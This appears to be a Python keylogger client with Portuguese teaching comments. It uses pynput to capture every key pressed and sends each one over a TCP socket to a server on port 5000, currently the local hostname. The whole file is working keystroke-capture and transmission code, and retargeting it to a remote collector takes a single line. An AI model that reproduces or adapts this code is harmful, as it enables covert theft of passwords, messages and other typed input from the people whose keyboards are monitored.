import socket
from pynput import keyboard


host = socket.gethostname()
# o host irá receber o conexão com o servidor para que o encontre

PORTA = 5000
# Usando a mesma analogia do serverP, a porta é por onde de fato os pacotes "entram" no servidor ou seja
# é necessário que seja a mesma para que ocorra a comunicação

client_socket = socket.socket()
# Instância do objeto do tipo socket no formatto TCP/IP

client_socket.connect((host, PORTA))
# a fução connect estabele a conexão com o servidor
# Quando a connect (conexão) foi estabelecida, o soquete pode ser utilizado para enviar uma solicitação de
# texto para o servidor. O mesmo soquete é que irá ler a resposta.


def on_press(key):
    keydata = str(key)

    try:
        print('Tecla {0} pressionada'.format(
            key.char))
        # Que faz o envio do dado para servidor.
        client_socket.send(keydata.encode())

    except AttributeError:
        print('Tecla especial {0} pressionada'.format(
            key))
        if (str(key) != "Key.backspace") and (str(key) != "Key.space") and (str(key) != "Key.esc"):
            pass
        else:
            # Que faz o envio do dado para servidor
            client_socket.send(keydata.encode())


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

